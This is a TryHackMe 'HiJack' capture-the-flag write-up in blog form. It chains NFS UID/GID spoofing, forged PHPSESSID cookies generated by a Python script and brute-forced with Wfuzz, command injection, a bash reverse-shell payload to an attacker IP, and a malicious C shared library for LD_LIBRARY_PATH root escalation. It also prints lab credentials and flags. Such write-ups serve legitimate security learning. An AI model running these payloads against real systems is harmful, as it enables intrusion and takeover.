@@ -1,0 +1,542 @@
+---
+title: 'HiJack'
+description: 'UID/GID spoofing over NFS, session hijacking through a predictable PHPSESSID, fuzzing with Wfuzz and a chained escalation to root.'
+publishDate: 2026-09-04
+tags:
+  - cybersecurity
+  - tryhackme
+  - web
+  - privesc
+---
+
+**Difficulty:** Medium **Category:** NFS (UID/GID spoofing), FTP, session prediction/forgery (Session Hijacking via a predictable `PHPSESSID`), brute force with Wfuzz on cookies, OS Command Injection, privilege escalation via `sudo` + `LD_LIBRARY_PATH` (shared-library hijacking) **Room:** [https://tryhackme.com/room/hijack](https://tryhackme.com/room/hijack)
+
+## Room description
+
+A Linux machine centred on a chain of configuration vulnerabilities: an **NFS export badly restricted by UID/GID**, which leaks FTP credentials; FTP credentials that in turn leak a password list; a web application whose session cookie (`PHPSESSID`) is generated **predictably** (`base64(user:md5(password))`), allowing an admin session to be forged without knowing the real password through targeted brute force; an admin panel vulnerable to **command injection**; and finally a privilege escalation exploiting the **`LD_LIBRARY_PATH`** environment variable, preserved by an insecure `sudo` configuration, to hijack a shared library loaded by Apache and run arbitrary code as root.
+
+> **Note on placeholders:** `{IP}` stands for the IP TryHackMe assigns (it changes on every deploy; these notes use `TARGET_IP` as an example from one specific session). The other values (user `rick`, passwords, paths) are fixed on this machine.
+
+---
+
+## 1. Recon (nmap, a prior step not in these notes)
+
+```bash
+nmap -sV -sC -p- {IP} -oN nmap_full.txt
+```
+
+**Expected ports:**
+
+| Port      | Service                                                              |
+| --------- | -------------------------------------------------------------------- |
+| 21/tcp    | FTP (vsftpd)                                                         |
+| 22/tcp    | SSH                                                                  |
+| 80/tcp    | HTTP (Apache)                                                        |
+| 111/tcp   | RPCbind                                                              |
+| 2049/tcp  | NFS                                                                  |
+| (various) | `mountd`, `nlockmgr` (NFS auxiliary services, on high dynamic ports) |
+
+The combination of **NFS + FTP + a website** is the first hint that the challenge will involve a chain of credentials leaked between services, similar in spirit to VulnNet: Internal, but with a different focus on the NFS part.
+
+---
+
+## 2. Exploring the NFS export
+
+```bash
+showmount -e {IP}
+```
+
+This confirms an available export, typically `/mnt/share`.
+
+```bash
+sudo mkdir -p /mnt/share
+sudo mount -t nfs {IP}:/mnt/share /mnt/share
+```
+
+Or, mounting it in a local working directory:
+
+```bash
+mkdir share
+sudo mount -t nfs {IP}:/mnt/share share/
+cd share
+ls -la
+```
+
+### 2.1 The problem: `Permission denied`
+
+Trying to access the content, you get a permission error:
+
+```
+cd share --> Permission denied
+```
+
+This happens because NFS, by default, **does not use a user/password authentication system like SMB**; instead, it trusts the **numeric UID/GID** of the connecting client’s operating system. The server exports the resource with a specific owner (a particular UID/GID), and only a **local user on the attacker machine** whose UID/GID exactly matches that of the remote owner can read/write that content — without the NFS server verifying “who you are” beyond that number.
+
+```bash
+ls -la /mnt/share
+```
+
+- `ls -la` on the mount point (even if you cannot enter the directory) usually shows the **numeric UID and GID** of the remote content’s real owner, revealing which values to spoof.
+
+---
+
+## 3. Spoofing the UID/GID (creating a “fake user”)
+
+To read the content, create a **local** user on the attacker machine whose UID and GID exactly match those of the remote NFS resource’s owner (here, `1003`):
+
+```bash
+sudo useradd fakeuser
+sudo usermod -u 1003 fakeuser
+sudo groupmod -g 1003 fakeuser
+```
+
+- `useradd fakeuser`: creates the user with a UID/GID automatically assigned by the system (usually different from the one needed).
+- `usermod -u 1003 fakeuser`: changes the newly created user’s UID to the exact value `1003`, matching the owner seen in the previous step’s `ls -la`.
+- `groupmod -g 1003 fakeuser`: does the same with that user’s primary group GID.
+
+### 3.1 Enable a shell and log in as `fakeuser`
+
+```bash
+sudo usermod -s /bin/bash fakeuser
+sudo su fakeuser
+```
+
+- By default, `useradd` may create the user without a valid login shell (`/usr/sbin/nologin`); fix it explicitly to use `su` normally.
+
+```bash
+cd share
+ls
+cat for_employees.txt
+```
+
+**Content revealed (FTP credentials):**
+
+```
+ftpuser:W3stV1rg1n14M0un741nM4m4
+```
+
+```bash
+exit
+```
+
+---
+
+## 4. FTP access and hidden files
+
+```bash
+ftp {IP}
+# Name: ftpuser
+# Password: W3stV1rg1n14M0un741nM4m4
+```
+
+```
+ftp> ls -la
+```
+
+- `-la`: it is important to use this variant (not just `ls`) because the relevant files are **hidden** (they start with `.`), and a basic listing would not show them.
+
+```
+ftp> get .from_admin.txt
+ftp> get .passwords_list.txt
+ftp> exit
+```
+
+### 4.1 Reviewing the downloaded files
+
+```bash
+cat .from_admin.txt
+```
+
+Contains an internal note, typically mentioning that a web admin panel exists and some hint about how it is protected (session-based authentication).
+
+```bash
+cat .passwords_list.txt
+```
+
+Contains a **list of possible passwords** (wordlist format), meant for use against the site’s admin panel — but not directly, as seen in the next step.
+
+---
+
+## 5. Registering a test user on the website
+
+Visit `http://{IP}/` and register a test account through the application’s normal registration form:
+
+```
+User: test
+Password: test_pass
+```
+
+### 5.1 Analysing the session cookie
+
+After logging in with this test account, inspect the assigned `PHPSESSID` cookie (browser DevTools → **Storage/Application → Cookies**, or intercepting the request with Burp Suite).
+
+Unlike a random, opaque session identifier (as it should be), this cookie turns out to be **Base64**-encoded, and decoding it reveals a predictable structure:
+
+```bash
+echo '<PHPSESSID_value>' | base64 -d
+```
+
+**Pattern discovered:**
+
+```
+user:md5(password)
+```
+
+That is, the session’s real value is simply `base64("test:5f4dcc3b5aa765d61d8327deb882cf99")` (where the second field is the MD5 hash of `test_pass`, all encoded together in Base64) — **with no random component nor cryptographic signature** to prevent an attacker from manually reconstructing any other user’s cookie, as long as they know (or can guess) that user’s password.
+
+### 5.2 Why this is exploitable against the `admin` user
+
+Since the **username** `admin` is known (assumed/confirmed by convention or room hints) and a **list of candidate passwords** is available (`.passwords_list.txt` obtained via FTP), it is possible to **locally reconstruct** what `admin`'s valid `PHPSESSID` cookie would be for each candidate password of the list, with no need to send any login attempt to the server — turning this into a **session-forgery** attack instead of a traditional login brute force (which, moreover, is usually protected by attempt limiting/_rate limiting_ in this room).
+
+---
+
+## 6. Generating the candidate cookies (`conv.py`)
+
+```bash
+nano conv.py
+```
+
+Script content (reconstruction of the pattern described above):
+
+```python
+import hashlib
+import base64
+
+user = "admin"
+
+with open("passwords_list.txt", "r") as f:
+    passwords = [line.strip() for line in f if line.strip()]
+
+with open("passwords_list_converted.txt", "w") as out:
+    for pwd in passwords:
+        md5_hash = hashlib.md5(pwd.encode()).hexdigest()
+        text = f"{user}:{md5_hash}"
+        cookie = base64.b64encode(text.encode()).decode()
+        out.write(cookie + "\n")
+```
+
+Breakdown:
+
+- `hashlib.md5(pwd.encode()).hexdigest()`: computes each candidate password’s MD5 hash, reproducing exactly the same operation the server does internally when generating the real cookie.
+- `f"{user}:{md5_hash}"`: reconstructs the `user:hash` string according to the pattern discovered in step 5.1.
+- `base64.b64encode(...)`: encodes that string in Base64, generating a **candidate** `PHPSESSID` cookie for each possible password of `admin`.
+
+```bash
+python3 conv.py
+```
+
+> **Note on permissions:** these notes mention that if the script has permission problems when run in the same directory as `.passwords_list.txt` (inherited from the NFS mount/FTP download owned by `fakeuser`), the simplest fix is to extract the content of that file and re-create it manually (`touch passwords_list_converted.txt` + paste the content) in a normal working directory, without depending on the downloaded file’s original permissions.
+
+This generates `passwords_list_converted.txt`, with a candidate Base64 cookie per line — one for each password of the original wordlist.
+
+---
+
+## 7. Brute forcing the cookie with Wfuzz
+
+```bash
+wfuzz -u http://{IP}/administration.php -w /path/passwords_list_converted.txt -X POST -b 'PHPSESSID=FUZZ' --hh 51
+```
+
+Parameter breakdown:
+
+- `-u http://{IP}/administration.php`: the URL of the protected admin panel.
+- `-w passwords_list_converted.txt`: the wordlist of **candidate cookies** generated in the previous step (not plaintext passwords — the attack happens entirely at the cookie level, without touching the login form).
+- `-X POST`: HTTP method used for the request (depending on how the page’s session verification is implemented).
+- `-b 'PHPSESSID=FUZZ'`: injects each wordlist value as the `PHPSESSID` cookie value in the request, in place of `FUZZ`.
+- `--hh 51`: **hides** responses whose size in bytes is exactly `51` — the typical response size for an invalid/unauthorised cookie (e.g. a short “access denied” page). By filtering that noise, the response(s) with a **different** size that remain visible correspond to attempts where the cookie **was** accepted as valid.
+
+**Result:**
+
+```
+Payload obtained (valid admin cookie): YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU
+```
+
+- This string, decoded from Base64, corresponds to `admin:<md5_hash_of_admin's_real_password>` — an admin session has been successfully forged **without needing to know `admin`'s plaintext password**, only its hashed version reconstructed through the attack.
+
+---
+
+## 8. Injecting the cookie into the browser
+
+1. Return to `http://{IP}/` with the browser.
+2. Open the developer tools → **Storage → Cookies**.
+3. Locate the `PHPSESSID` cookie and replace its **value** with the payload obtained with Wfuzz.
+4. Reload the page (if needed).
+
+On reloading, the browser session becomes authenticated as **`admin`**, without ever having logged in with those credentials conventionally.
+
+---
+
+## 9. Admin panel — Command Injection
+
+Inside the admin panel (now authenticated as `admin`), there is a **service status check** feature (for example, a field to check whether a system service is running), which internally runs an OS command using the provided service name — without correctly sanitising the input.
+
+### 9.1 Confirm the injection
+
+```
+apache2;id
+```
+
+- The `;` separator allows chaining a second command (`id`) after the expected service name (`apache2`); if the page’s result includes the output of `id` (`uid=33(www-data) gid=33(www-data) groups=33(www-data)`), the injection is confirmed.
+
+Alternatively, using the `&` operator (depending on how command concatenation is implemented in the backend):
+
+```
+&id
+```
+
+### 9.2 Getting a reverse shell
+
+Prepare a listener on the attacker machine:
+
+```bash
+nc -lvnp 4444
+```
+
+- To get the correct IP of the TryHackMe VPN interface: `ip a | grep tun0`.
+
+Send the reverse-shell payload through the same vulnerable field:
+
+```
+&bash -c "bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1"
+```
+
+When processed, the server runs the command and the listener receives the connection:
+
+```bash
+id
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### 9.3 Stabilise the terminal
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+Then, in your local terminal:
+
+```
+Ctrl+Z
+stty raw -echo; fg
+```
+
+And inside the remote shell:
+
+```bash
+reset
+export TERM=xterm
+```
+
+(Note: `reset` clears the terminal state, useful if `stty raw -echo` left it visually confusing before adjusting `TERM`.)
+
+---
+
+## 10. Lateral movement — from `www-data` to `rick` (first flag)
+
+```bash
+ls -la
+cat config.php
+```
+
+The web application’s configuration file (`config.php`, typical in PHP applications to store database credentials or others) leaks, on this machine, a reusable password for a system user.
+
+```bash
+cat /etc/passwd
+```
+
+Identify the corresponding system user:
+
+```
+rick:x:1003:1003::/home/rick:
+```
+
+> Note: `rick`'s UID `1003` is the **same** value used to spoof the NFS resource’s owner at the start of the machine — a design hint connecting both findings, although it is not strictly necessary to complete this step.
+
+```bash
+su rick
+# password: N3v3rG0nn4G1v3Y0uUp   (obtained from config.php)
+```
+
+```bash
+id
+cat /home/rick/user.txt
+```
+
+**First flag:**
+
+<Flag value="THM{fdc8cd4cff2c19e0d1022e78481ddf36}" />
+
+---
+
+## 11. Privilege escalation — Shared-library hijacking via `LD_LIBRARY_PATH`
+
+### 11.1 Enumerating sudo permissions
+
+```bash
+sudo -l
+# password: N3v3rG0nn4G1v3Y0uUp
+```
+
+Expected output:
+
+```
+Matching Defaults entries for rick on hijack:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
+    env_keep+=LD_LIBRARY_PATH
+
+User rick may run the following commands on hijack:
+    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
+```
+
+Two critical facts in this output:
+
+1. `rick` can run **`apache2`** as root, with a configuration and directory already fixed in the allowed command.
+2. The line **`env_keep+=LD_LIBRARY_PATH`** is the key to the whole escalation: by default, `sudo` **cleans** (resets) most of the user’s environment variables before running a command (`env_reset`), as a security measure — precisely to prevent this kind of attack. However, here an **exception** has been explicitly configured: the `LD_LIBRARY_PATH` variable is **kept** (`env_keep`) from the environment of the user invoking `sudo`, even when running the command as root.
+
+### 11.2 What is `LD_LIBRARY_PATH` and why is it dangerous here?
+
+`LD_LIBRARY_PATH` is an environment variable that tells Linux’s dynamic _linker_ **which directories to search first** for the shared libraries (`.so`) a program needs to load when running — **before** searching the system’s standard paths (`/lib`, `/usr/lib`, etc.).
+
+If an attacker can control this variable’s value **and** the program running with elevated privileges loads some library by name (without a fixed absolute path), it is possible to place a **malicious library with the same name** in a directory under their control, point `LD_LIBRARY_PATH` to that directory, and get the program to load (and run code from) the fake library instead of the legitimate one — with the same privileges as the process loading it (here, root, since Apache runs via `sudo`).
+
+### 11.3 Identify which libraries Apache loads
+
+```bash
+ldd /usr/sbin/apache2
+```
+
+- `ldd`: lists all the dynamic shared libraries a binary will load when running, along with the path from which they would normally be loaded.
+
+From the list, choose a candidate library for the hijack — for example, **`libcrypt.so.1`**.
+
+### 11.4 Creating the malicious library
+
+```bash
+cat > /home/rick/malicious_code.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+EOF
+```
+
+Breakdown of the C code:
+
+- `static void hijack() __attribute__((constructor));`: declares the `hijack()` function with GCC’s special **`constructor`** attribute. This tells the compiler this function must run **automatically, as soon as the shared library is loaded into memory** — without any other code explicitly calling it. That is, it is enough for Apache to **load** this library (even if it never uses any of its “real” functions) for `hijack()` to fire.
+- `unsetenv("LD_LIBRARY_PATH")`: removes the environment variable within the process itself, preventing that if `bash` or another later subprocess tries to load libraries, it enters a recursive loop loading this same malicious library over and over.
+- `setresuid(0,0,0)`: explicitly sets the process’s real, effective and saved UID to `0` (root) — a reinforcement step, since in theory the process is already running as root having been launched via `sudo`, but it ensures the shell launched next inherits that UID consistently.
+- `system("/bin/bash -p")`: launches an interactive Bash shell, with `-p` (_privileged_ mode) to prevent Bash from automatically dropping the inherited effective privileges (Bash’s default behaviour when it detects real UID ≠ effective UID).
+
+### 11.5 Compile the library with the exact expected name
+
+```bash
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/rick/malicious_code.c
+```
+
+- `-shared`: tells GCC to compile a **shared library** (`.so`), not a standalone executable.
+- `-fPIC` (_Position Independent Code_): generates code independent of the memory position where it is loaded, a standard requirement for any shared library on Linux.
+- `-o /tmp/libcrypt.so.1`: the output name must match **exactly** that of the legitimate library being spoofed (`libcrypt.so.1`), so the dynamic _linker_ accepts it as a valid substitute when looking for it in the directory indicated by `LD_LIBRARY_PATH`.
+
+### 11.6 Trigger the execution
+
+```bash
+sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
+```
+
+- `LD_LIBRARY_PATH=/tmp`: prepends `/tmp` (where the malicious library was compiled) to the library search path, for this specific `sudo` execution.
+- Since `sudo` is configured to **keep** this variable (`env_keep+=LD_LIBRARY_PATH`), its value propagates to the `apache2` process launched with root privileges.
+- On startup, Apache tries to load `libcrypt.so.1` — and, thanks to `LD_LIBRARY_PATH`, finds the malicious version in `/tmp` first instead of the legitimate system one — firing the `hijack()` function automatically through its `constructor` attribute.
+
+```bash
+# rick's password, if requested:
+N3v3rG0nn4G1v3Y0uUp
+```
+
+### 11.7 If an Apache startup error appears
+
+If the previous command fails (for example, because Apache cannot find its configuration file with the default parameters), explicitly specify the same configuration that appears allowed in `sudo -l`:
+
+```bash
+sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
+```
+
+- `-f /etc/apache2/apache2.conf`: explicit path to the main configuration file.
+- `-d /etc/apache2`: Apache’s configuration root directory (_ServerRoot_).
+
+When it runs correctly, the malicious library’s `hijack()` function fires **before** Apache finishes starting up as a normal web server, delivering an interactive root shell:
+
+```bash
+id
+# uid=0(root) gid=0(root)
+```
+
+### 11.8 Root flag
+
+```bash
+cat /root/root.txt
+```
+
+**Result:**
+
+<Flag value="THM{b91ea3e8285157eaf173d88d0a73ed5a}" />
+
+---
+
+## 12. Cleanup (lab good practice)
+
+These notes include a final cleanup step of the local working environment, recommended good practice after finishing any exercise that modified the attacker system itself:
+
+```bash
+# Unmount the NFS resource
+sudo umount ~/thm/HiJack/share
+
+# Remove the locally created "fakeuser"
+sudo userdel fakeuser
+
+# Delete temporary files downloaded/generated during the exercise
+rm ~/thm/HiJack/.from_admin.txt
+rm ~/thm/HiJack/.passwords_list.txt
+rm ~/thm/HiJack/passwords_list_converted.txt
+rm ~/thm/HiJack/conv.py
+```
+
+---
+
+## 13. Attack chain summary
+
+1. **Recon** with `nmap` → FTP (21), SSH (22), HTTP (80), NFS (2049) + auxiliary RPC services.
+2. **Mounting an NFS export** → access denied due to UID/GID mismatch.
+3. **Creating a local user with spoofed UID/GID** (`fakeuser`, UID/GID `1003`) → access to the NFS content → FTP credentials in `for_employees.txt`.
+4. **FTP access** → download hidden files: internal note (`.from_admin.txt`) and password list (`.passwords_list.txt`).
+5. **Registering a test user on the website** → analyse the `PHPSESSID` cookie → predictable pattern: `base64(user:md5(password))`.
+6. **`conv.py` script**: generates candidate `PHPSESSID` cookies for user `admin`, combining each wordlist password with the discovered pattern.
+7. **Brute force with Wfuzz** on the cookie value (`-b 'PHPSESSID=FUZZ'`, filtering by response size with `--hh`) → valid `admin` cookie.
+8. **Manual cookie injection** into the browser → forged admin session without knowing the real password.
+9. **Command Injection** in the admin panel (service checker) → reverse shell as `www-data`.
+10. **Lateral movement**: `config.php` leaks the system user `rick`'s password → `su rick` → first flag.
+11. **Privilege escalation**: `sudo -l` reveals a permission on `apache2` with `env_keep+=LD_LIBRARY_PATH` → identify a library loaded by Apache (`ldd`) → compile a homonymous malicious library with a `constructor` function → trigger via `sudo LD_LIBRARY_PATH=/tmp apache2` → root shell.
+12. Final **root flag**.
+
+## 14. Lessons learned / key concepts
+
+- **NFS trusts numeric UID/GID, not user/password authentication**: any attacker who can create arbitrary local users on their own machine (trivial with local root access) can impersonate any UID/GID, unless the NFS server applies additional restrictions (like `root_squash`, allowed-IP lists, or Kerberos/NFSv4 with real authentication).
+- **Predictable/reconstructible session cookies** (like `base64(user:md5(password))` with no random component nor signature) are a serious vulnerability: an attacker who knows (or can enumerate) any user’s password can locally generate a valid session without going through the real login flow — and, worse, without the login service itself detecting any failed attempt, thus bypassing rate limiting designed only for the login form.
+- **Wfuzz with `--hh`/`--hc`** (hide by response size or status code) is a fundamental technique to filter noise in any brute-force attack against an HTTP parameter, whether a directory, a GET parameter, or — as here — a cookie value.
+- **`env_keep` in the `sudo` configuration** (visible in `sudo -l`) is an extremely powerful and often underestimated escalation source: any “kept” environment variable that can influence a privileged program’s behaviour (library paths, module paths, interpreter config variables) is a candidate for abuse.
+- **GCC’s `__attribute__((constructor))`** is a legitimate technique used in normal programming (to initialise resources when a library loads), but it becomes a perfect attack vector in library-hijacking scenarios: it does not require the attacker to know which “real” functions the original library exports, it is enough for the malicious library to be **loaded** for the malicious code to run automatically.
+- **`ldd` on a privileged binary** is the first step to identify shared-library hijacking candidates — any dynamically loaded library potentially influenceable by `LD_LIBRARY_PATH`, `LD_PRELOAD`, or non-absolute search paths is a vector to evaluate.
+
+## 15. Tools used
+
+`nmap`, `showmount` / `mount -t nfs`, `useradd`/`usermod`/`groupmod` (UID/GID spoofing), the `ftp` client, a browser (cookie inspection) / Burp Suite, Python (`hashlib`, `base64` — `conv.py` script), `wfuzz`, `netcat`, `python3` (shell stabilisation), `gcc` (compiling the malicious library), `ldd`, `sudo`.
+
+---
+
+_Academic write-up, built from my own notes solving the “HiJack” machine on TryHackMe, supplemented with public community write-ups to complete the initial recon, the explanation of the predictable `PHPSESSID` cookie pattern, the reconstructed content of the `conv.py` script, and the full technical mechanism of the privilege escalation via `LD_LIBRARY_PATH`._
